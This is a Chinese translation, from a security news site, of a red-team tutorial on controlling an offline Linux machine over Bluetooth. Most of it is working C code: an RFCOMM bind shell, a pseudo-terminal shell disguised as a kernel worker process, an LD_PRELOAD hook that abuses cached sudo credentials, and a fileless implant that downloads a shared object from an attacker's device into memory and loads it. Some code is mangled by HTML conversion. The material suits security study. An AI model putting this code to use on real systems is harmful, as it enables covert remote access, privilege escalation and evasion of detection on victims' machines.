# 如何只通过蓝牙建立交互式Shell

阅读量 **191454**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-06-07 12:00:23

 **x**

##### 译文声明

本文是翻译文章，文章来源：https://www.tarlogic.com/

原文地址：<https://www.tarlogic.com/en/blog/interactive-shell-via-bluetooth/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t012c29f956ae9de143.jpg)

## 写在前面的话

在练习中，偶尔会碰到一个或几个需要物理访问机器的阶段。在这篇文章中，介绍了如何在没有互联网连接的Linux电脑中使用的物理方法入侵，当然可以使用Wi-Fi和蓝牙。  
这篇文章的主要目的是面向年轻读者，记录和解释以下几点：  
1.如何通过蓝牙在两台设备之间通过RFCOMN交换信息  
2.如何获取交互式shell以运行命令  
3.如何使用sudo缓存以提升权限  
4.如何在内存中运行二进制文件以减少跟踪

## 介绍

由于目标机器不能连接到互联网，所以操作受到了限制，应当考虑其他方案来实现远程操作。最简单的方法是建立一个小型Wi-Fi接入点并将受感染的机器连接到它。然而，考虑到给定的情况，还有另一种方式：通过蓝牙建立通信。

## 通过蓝牙与攻击者连接

为了简单起见，被入侵的机器和Red团队之间的信息交换是通过RFCOMM协议进行的。对接受连接的小型服务器进行编程非常简单，因为它与TCP /
IP应该如何完成相似：

    
    
    #include <sys/socket.h>                                        
    #include <bluetooth/bluetooth.h>                               
    #include <bluetooth/rfcomm.h>                                  
    
     #define BANNER "[+] You are connected to the device!n"        
    
     // https://people.csail.mit.edu/albert/bluez-intro/x502.html   
    
     int main (int argc, char *argv[]) {                            
         int s, client;                                             
    
         /*                                                         
         struct sockaddr_rc {                                       
             sa_family_t rc_family;                                 
             bdaddr_t    rc_bdaddr;                                 
             uint8_t     rc_channel;                                
         };                                                         
         */                                                         
    
         struct sockaddr_rc loc_addr = {0}, client_addr = {0};      
         socklen_t opt = sizeof(client_addr);                       
    
         s = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);     
    
         loc_addr.rc_family = AF_BLUETOOTH;                         
         loc_addr.rc_bdaddr = *BDADDR_ANY; // Cualquier adaptador disponible en la máquina                                                   
         loc_addr.rc_channel = (uint8_t) 1; // Canal 1              
    
         bind(s, (struct sockaddr *)&loc_addr, sizeof(loc_addr));   
         listen(s,1);                                               
    
         for(;;) {                                                  
             client = accept(s, (struct sockaddr *)&client_addr, &opt);                                                                      
             printf("[+] New connection!n");                       
    
             // Escribimos un mensaje al cliente que se ha conectado
             write(client, BANNER, strlen(BANNER));                 
         }                                                          
         close(client);                                             
         close(s);
         return 0;                                                          
     }
    

在运行之前，应该启用蓝牙设备以便进行配对和通信：  
`hciconfig hci0 piscan`

配对完成后，我们可以与使用“BlueTerm”Android应用程序创建的服务器进行通信，以进行概念验证。

![](https://p0.ssl.qhimg.com/t0160a1da8b8195ce56.jpg)

作为服务器的其它选择和更好的替代方式是作为客户机。我们必须创建一个小程序来搜索任何可用的蓝牙设备，并基于某个简单的前提（例如，特定的名称或地址）并尝试连接到自己。然后，开始信息交换。下面是如何实现上述逻辑的示例:

    
    
    #include <sys/socket.h>
    #include <bluetooth/bluetooth.h>
    #include <bluetooth/hci.h>
    #include <bluetooth/hci_lib.h>
    #include <bluetooth/rfcomm.h>
    
    // Nombre del dispotivo que queremos encontrar
    #define TARGET "Gojira"
    #define BANNER "Connected to device!n"
    
    // https://people.csail.mit.edu/albert/bluez-intro/c404.html
    
    int connect_client(char *address) {
        struct sockaddr_rc addr = {0};
        int s, client;
        s = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
        addr.rc_family = AF_BLUETOOTH;
        addr.rc_channel = (uint8_t) 1;
        str2ba(address, &addr.rc_bdaddr);
        client = connect(s, (struct sockaddr*)&addr, sizeof(addr));
        if (client < 0) {
            fprintf(stderr, "[-] Error: could not connect to targetn");
            return 0;
        }
        write(s, BANNER, strlen(BANNER));
        return 1;
    }
    
    
    int main (int argc, char **argv) {
        inquiry_info *ii = NULL;
        int max_rsp, num_rsp;
        int dev_id, sock, len, flags, i;
        char addr[19] = {0};
        char name[248] = {0};
    
        // Utilizamos el primer bluetooth disponible
        dev_id = hci_get_route(NULL);
        sock = hci_open_dev(dev_id);
        if (dev_id < 0 || sock < 0) {
            fprintf(stderr, "[-] Error opening socketn");
            exit(EXIT_FAILURE);
        }
    
        len = 8;
        max_rsp = 255;
    
        // Limpiamos los dispositivos que puedan estar cacheados anteriormente
        flags = IREQ_CACHE_FLUSH;
        ii = (inquiry_info*) malloc(max_rsp * sizeof(inquiry_info));
    
        // Bucle para escanear
        for(;;) {
            // Escaneo
            num_rsp = hci_inquiry(dev_id, len, max_rsp, NULL, &ii, flags);
            if (num_rsp < 0) {
                fprintf(stderr, "[+] Error inquiry operationn");
                free(ii);
                exit(EXIT_FAILURE);
            }
    
            // Iteramos por todos los dispoitivos encontrados
            for (i=0; i < num_rsp; i++) { ba2str(&(ii+i)->bdaddr, addr);
                memset(name, 0, sizeof(name));
    
                // Leemos el nombre de los dispositivos descubiertos
                hci_read_remote_name(sock, &(ii+i)->bdaddr, sizeof(name), name, 0);
    
                // Comprobamos si es el que estamos buscando
                if (strcmp(TARGET, name) == 0) {
                    printf("Found! %s - %sn", name, addr);
                    free(ii);
                    close(sock);
                    connect_client(addr);
                    exit(EXIT_SUCCESS);
                }
            }
    
        }
    }
    

这些例子还强调了如何使用异常的RFCOMM来建立快速通信。

## 获取交互式shell

以下步骤是指从我们自己的移动电话或任何其他设备在机器中运行命令。为此，我们将继续以机器本身中等待连接的服务器为例。获取shell最常用的方法是分离进程，使用socket作为`stdin/stdout/stderr`进行子进程并运行命令解释器

    
    
    #include lt;stdio.h>
    #include lt;stdlib.h>
    #include lt;unistd.h>
    #include lt;signal.h>
    #include lt;string.h>
    #include lt;sys/socket.h>
    #include lt;bluetooth/bluetooth.h>
    #include lt;bluetooth/rfcomm.h>
    
    #define BANNER "[+] You are connected to the device!n"
    
    // https://people.csail.mit.edu/albert/bluez-intro/x502.html
    
    int main (int args, char *argv[]) {
        int s, client;
        pid_t pid;
    
        signal(SIGCHLD, SIG_IGN);
        /*     
        struct sockaddr_rc {
            sa_family_t rc_family;
            bdaddr_t    rc_bdaddr;
            uint8_t     rc_channel;
        }; 
        */
    
        struct sockaddr_rc loc_addr = {0}, client_addr = {0};
        socklen_t opt = sizeof(client_addr);
    
        s = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
    
        loc_addr.rc_family = AF_BLUETOOTH;
        loc_addr.rc_bdaddr = *BDADDR_ANY; // Cualquier adaptador disponible en la máquina 
        loc_addr.rc_channel = (uint8_t) 1; // Canal 1
    
        bind(s, (struct sockaddr *)&loc_addr, sizeof(loc_addr));
        listen(s,1);
    
        for(;;) {
            client = accept(s, (struct sockaddr *)&client_addr, &opt);
            printf("[+] New connection!n");
    
            // Escribimos un mensaje al cliente que se ha conectado
            write(client, BANNER, strlen(BANNER));
    
            pid = fork();
            if (pid == 0) {
                dup2(client, 0);
                dup2(client, 1);
                dup2(client,2);
                execve("/bin/sh", NULL, NULL);
            }
        }
        close(client);
        close(s);
        return 0;
    }
    

以这种方式运行命令时的根本问题可能是出现了限制，因为我们不能通过SSH启动会话，使用VIM等。

  
自从几年前，可能是由于OSCP和衍生产品，大量的文章详细介绍了不同的方法，以便从一个有限的shell传递到真正的交互式shell。其中一些方法是：

  * 带`pty.spawn（“/ bin / bash”）`的经典Python单行程式
  * 带`“pty”`选项的Socat
  * `Expect / script`
  * `stty`

但是，如果我们有机会使用我们自己的二进制文件作为在机器中运行命令的方法，使用[forkpty()](https://linux.die.net/man/3/forkpty)，可以创建一个从伪终端操作的子进程，并且可以从那里运行该shell。证明如下：

    
    
    #include <sys/socket.h>
    #include <bluetooth/bluetooth.h>
    #include <bluetooth/rfcomm.h>
    #include 
    #include <sys/select.h>
    #include <sys/wait.h>
    #include 
    
    #define BANNER "[+] You are connected to the device!n"
    
    // https://people.csail.mit.edu/albert/bluez-intro/x502.html
    
    int main (int args, char *argv[]) {
        int s, client;
    
        signal(SIGCHLD, SIG_IGN);
        /*     
        struct sockaddr_rc {
            sa_family_t rc_family;
            bdaddr_t    rc_bdaddr;
            uint8_t     rc_channel;
        }; 
        */
    
        struct sockaddr_rc loc_addr = {0}, client_addr = {0};
        socklen_t opt = sizeof(client_addr);
    
        s = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
    
        loc_addr.rc_family = AF_BLUETOOTH;
        loc_addr.rc_bdaddr = *BDADDR_ANY; // Cualquier adaptador disponible en la máquina 
        loc_addr.rc_channel = (uint8_t) 1; // Canal 1
    
        bind(s, (struct sockaddr *)&loc_addr, sizeof(loc_addr));
        listen(s,1);
    
        for(;;) {
            client = accept(s, (struct sockaddr *)&client_addr, &opt);
            printf("[+] New connection!n");
    
            // Escribimos un mensaje al cliente que se ha conectado
            write(client, BANNER, strlen(BANNER));
            dup2(client, 0);
            dup2(client, 1);
            dup2(client,2);
    
            //A partir de aquí empieza la magia    
            struct termios terminal;
            int terminalfd, n = 0;
            pid_t pid;
            char input[1024];
            char output[1024];
    
            // Creamos un nuevo proceso hijo que operará en un pseudoterminal
            pid = forkpty(&terminalfd, NULL, NULL, NULL);
    
            if (pid < 0) {
                fprintf(stderr, "[-] Error: could not forkn");
                exit(EXIT_FAILURE);
            }
            else if (pid == 0) { // Estamos en el proceso hijo que tiene el PTY
                execlp("/bin/zsh", "[kworker:01]", NULL); 
            }
            else { // Proceso padre
                // Atributos: sin ECHO 
                tcgetattr(terminalfd, &terminal);
                terminal.c_lflag &= ~ECHO;
                tcsetattr(terminalfd, TCSANOW, &terminal);
    
                // Utilizaremos select para comprobar si hay datos y enviarlos en un sentido u otro
                fd_set readfd;
                for(;;) {
                    FD_ZERO(&readfd);
                    FD_SET(terminalfd, &readfd); // Si terminalfd tiene datos
                    FD_SET(1, &readfd); // Si el socket tiene datos
                    select(terminalfd + 1, &readfd, NULL, NULL, NULL);
                    if (FD_ISSET(terminalfd, &readfd)) { // Hay datos desde el proceso hijo
                        n = read(terminalfd, &output, 1024);
                        if (n <= 0) { write(2, "[+] Shell is dead. Closing connection!nn", strlen("[+] Shell is dead. Closing connection!nn")); break; } write(2, output, n); // Los mandamos por el socket memset(&output, 0, 1024); } if (FD_ISSET(1, &readfd)) { // Hay datos en el socket memset(&input, 0, 1024); n = read(1, &input, 1024); if (n > 0) {
                            write(terminalfd, input, n); // Los escribimos en el STDIN del proceso hijo
                        }
                    }
                }
    
    
            }
        }
        close(client);
        close(s);
        return 0;
    }
    

在下面的图片中，我们可以清楚地看到我们之前没有伪端点的外壳的不同之处:

  
  
通过这些基础知识，我们可以通过蓝牙使用Shell创建一个小型二进制机器控制器。让我们继续

## 通过sudo缓存提高权限

虽然在前面的章节中，我们重点介绍了通过蓝牙实现控制的概念证明，但理想情况下，我们的程序应尽可能以最大权限运行。可以使用的最古老的技术之一是利用sudo缓存运行命令或我们自己的二进制文件。

默认情况下，当终端首次运行sudo时，需要用户的密码。但是，此密码会在一段时间内被缓存，阻止用户在每次使用sudo执行任务时引入该密码。如果我们在执行sudo的终端中重复运行我们自己的二进制文件，这个功能很容易被滥用。因此，我们希望找到一个时间窗口，其中密码被缓存并且未被请求，以便我们最终可以执行sudo。

实现上述事实的最简单方法是编辑文件.bashrc（或其他使用其他shell的等效文件），并将环境变量LD_PRELOAD添加到我们的某个库中。这就是我们如何在运行在该shell中的动态链接二进制文件中预加载我们的库。当预加载我们的库时，我们可以自由地挂接运行的任何函数。因此，每次调用该函数时，我们的一个主管职能部门应检查凭证是否被缓存：如果是这种情况，将开始所需的一组操作。

重要：我们不会在sudo中加载我们的库（因为它包含suid），我们真正在做的是将其加载到其他二进制文件中，以便每当运行挂钩函数时检查是否可以在不注册密码的情况下执行sudo
。

作为概念的简单证明，我们可以使用以下示例来表示工作流程：

    
    
    #define _GNU_SOURCE                                                                                                                                                                                        
    #include <sys/stat.h>                                                                                           
    
    #include <sys/wait.h>                                                                                           
    //Basado en https://blog.maleadt.net/2015/02/25/sudo-escalation/                                                
    typedef int (*orig_open_f_type) (const char *pathname, int flags);                                              
    
    int open(const char *pathname, int flags, ...){ // A modo de ejemplo "hookearemos" open()                                                                
        orig_open_f_type orig_open;                                                                                 
        pid_t pid, extrapid;                                                                                        
        int empty, exitcode;                                                                                        
    
        orig_open = (orig_open_f_type) dlsym(RTLD_NEXT, "open"); // Guardamos una referencia a la función open original                                                    
    
        pid = fork(); // Nos forkeamos para comprobar si sudo se encuentra cacheado o no                          
        if (pid == 0) { //Si estamos en el hijo...    
            empty = orig_open("/dev/null", O_WRONLY);                                                               
            dup2(empty, STDERR_FILENO); // ...silenciamos cualquier error...                                                           
            execlp("sudo", "sudo", "-n", "true", NULL);// ...y ejecutamos sudo                                        
            exit(-1);                                                                                               
        } else {   // Estamos en el padre...
            wait(&exitcode);                                                                                        
            if (WIFEXITED(exitcode) && WEXITSTATUS(exitcode) == 0) {                                                
                if (exitcode == 0){ // Si todo ha ido bien y hemos podido ejecutar sudo...                                          
                    extrapid = fork(); //Nos forkeamos para dejar fluir el programa                               
                    if (extrapid == 0) {                                                                            
                        printf("It worked!n"); // Y ejecutamos lo que queramos                                         
                        execlp("sudo", "sudo", "id", NULL);                                                         
                    }                                                                                               
                }  
            }      
        }          
        return orig_open(pathname, flags); // Llamamos al open() original y devolvemos el resultado                                     
    }
    

## 在内存中运行二进制文件

从内核3.17开始，我们依赖一个名为[“ memfd_create ”
](https://dvdhrm.wordpress.com/2014/06/10/memfd_create2/)的新系统调用，它可以收集与内存相关的文件描述符。通过这种方式，可以执行文件操作，但这些操作不会链接到文件系统。因此，我们可以使用它来托管包含最相关代码的库或二进制文件（可通过蓝牙下载）。这就是我们应该如何处理一个负责仅连接和下载一系列模块的框架。但是将它们下载到`/dev/shm`并在运行或加载后快速删除它们。这些想法在[‘Loading
“fileless” Shared Objects (memfd_create + dlopen)’
](https://x-c3ll.github.io/posts/fileless-memfd_create/)后进行详细说明。

我们将结合这篇文章中讨论的所有内容（包括任何特定名称检测，连接，下载和加载的蓝牙设备）作出以下代码：

    
    
    #define _GNU_SOURCE
    #include <sys/socket.h>
    #include <bluetooth/bluetooth.h>
    #include <bluetooth/hci.h>
    #include <bluetooth/hci_lib.h>
    #include <bluetooth/rfcomm.h> 
    #include <sys/mman.h>
    #include <sys/stat.h>
    #include <sys/syscall.h>
    #include <sys/utsname.h>
    #define TARGET "Gojira"
    #define SHM_NAME "IceIceBaby"
    #define __NR_memfd_create 319 // https://code.woboq.org/qt5/include/asm/unistd_64.h.html
    
    
    // Wrapper to call memfd_create syscall
    static inline int memfd_create(const char *name, unsigned int flags) {
        return syscall(__NR_memfd_create, name, flags);
    }
    
    // Detect if kernel is < or => than 3.17
    // Ugly as hell, probably I was drunk when I coded it
    int kernel_version() {
        struct utsname buffer;
        uname(&buffer);
    
        char *token;
        char *separator = ".";
    
        token = strtok(buffer.release, separator);
        if (atoi(token) < 3) { return 0; } else if (atoi(token) > 3){
            return 1;
        }
    
        token = strtok(NULL, separator);
        if (atoi(token) < 17) {
            return 0;
        }
        else {
            return 1;
        }
    }
    
    
    // Returns a file descriptor where we can write our shared object
    int open_ramfs(void) {
        int shm_fd;
    
        //If we have a kernel < 3.17
        // We need to use the less fancy way
        if (kernel_version() == 0) {
            shm_fd = shm_open(SHM_NAME, O_RDWR | O_CREAT, S_IRWXU);
            if (shm_fd < 0) { //Something went wrong <img draggable="false" class="emoji" alt="🙁" src="https://s.w.org/images/core/emoji/2.3/svg/1f641.svg"> fprintf(stderr, "[-] Could not open file descriptorn"); exit(-1); } } // If we have a kernel >= 3.17
        // We can use the funky style
        else {
            shm_fd = memfd_create(SHM_NAME, 1);
            if (shm_fd < 0) { //Something went wrong <img draggable="false" class="emoji" alt="🙁" src="https://s.w.org/images/core/emoji/2.3/svg/1f641.svg">
                fprintf(stderr, "[- Could not open file descriptorn");
                exit(-1);
            }
        }
        return shm_fd;
    }
    
    
    // Load the shared object
    void load_so(int shm_fd) {
        char path[1024];
        void *handle;
    
        printf("[+] Trying to load Shared Object!n");
        if (kernel_version() == 1) { //Funky way
            snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
        } else { // Not funky way <img draggable="false" class="emoji" alt="🙁" src="https://s.w.org/images/core/emoji/2.3/svg/1f641.svg">
            close(shm_fd);
            snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
        }
        handle = dlopen(path, RTLD_LAZY);
        if (!handle) {
            fprintf(stderr,"[-] Dlopen failed with error: %sn", dlerror());
        }
    }
    
    //Connect to client, read module and write to RAM
    int download_to_RAM(char *address) {
        struct sockaddr_rc addr = {0};
        char recvBuff[2048];
        int s, client, fd, size;
    
        s = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
        addr.rc_family = AF_BLUETOOTH;
        addr.rc_channel = (uint8_t) 1;
        str2ba(address, &addr.rc_bdaddr);
        client = connect(s, (struct sockaddr*)&addr, sizeof(addr));
    
        if (client < 0) {
            fprintf(stderr, "[-] Error: could not connect to targetn");
            exit(-1)
        }
    
        fd = open_ramfs();
        printf("[+] File descriptor for RAM file createdn");
        printf("[+] Reading file from socket & writting to RAM file... ");
        while(1) {
            if ((size = read(s, recvBuff, 2048)) <= 0) {
                printf("finishedn");
                break;
            }
            write(fd, recvBuff, size);
        }
        return fd;
    }
    
    
    int main (int argc, char **argv) {
        int fd;
        inquiry_info *ii = NULL;
        int max_rsp, num_rsp;
        int dev_id, sock, len, flags, i;
        char addr[19] = {0};
        char name[248] = {0};
    
        // Utilizamos el primer bluetooth disponible
        dev_id = hci_get_route(NULL);
        sock = hci_open_dev(dev_id);
        if (dev_id < 0 || sock < 0) {
            fprintf(stderr, "[-] Error opening socketn");
            exit(EXIT_FAILURE);
        }
    
        len = 8;
        max_rsp = 255;
    
        // Limpiamos los dispositivos que puedan estar cacheados anteriormente
        flags = IREQ_CACHE_FLUSH;
        ii = (inquiry_info*) malloc(max_rsp * sizeof(inquiry_info));
    
        // Bucle para escanear
        for(;;) {
            // Escaneo
            num_rsp = hci_inquiry(dev_id, len, max_rsp, NULL, &ii, flags);
            if (num_rsp < 0) {
                fprintf(stderr, "[+] Error inquiry operationn");
                free(ii);
                exit(EXIT_FAILURE);
            }
    
            // Iteramos por todos los dispoitivos encontrados
            for (i=0; i < num_rsp; i++) { ba2str(&(ii+i)->bdaddr, addr);
                memset(name, 0, sizeof(name));
    
                // Leemos el nombre de los dispositivos descubiertos
                hci_read_remote_name(sock, &(ii+i)->bdaddr, sizeof(name), name, 0);
    
                // Comprobamos si es el que estamos buscando
                if (strcmp(TARGET, name) == 0) {
                    printf("Found! %s - %sn", name, addr);
                    free(ii);
                    close(sock);
                    fd = download_to_RAM(addr);
                    load_so(fd);
                    exit(EXIT_SUCCESS);
                }
            }
    
        }
        exit(0);
    }

本文翻译自https://www.tarlogic.com/
[原文链接](https://www.tarlogic.com/en/blog/interactive-shell-via-bluetooth/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **无名小卒** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/147024](/post/id/147024)

安全客 - 有思想的安全新媒体

本文转载自:
[https://www.tarlogic.com/](https://www.tarlogic.com/en/blog/interactive-shell-via-bluetooth/)

如若转载,请注明出处： <https://www.tarlogic.com/en/blog/interactive-shell-via-bluetooth/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [蓝牙](/tag/蓝牙)
  * [技术分析](/tag/技术分析)
  * [安全研究](/tag/安全研究)

 **+1** __1赞

 __收藏

![](https://p3.ssl.qhimg.com/t013aa021a06d47a307.png) 无名小卒

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

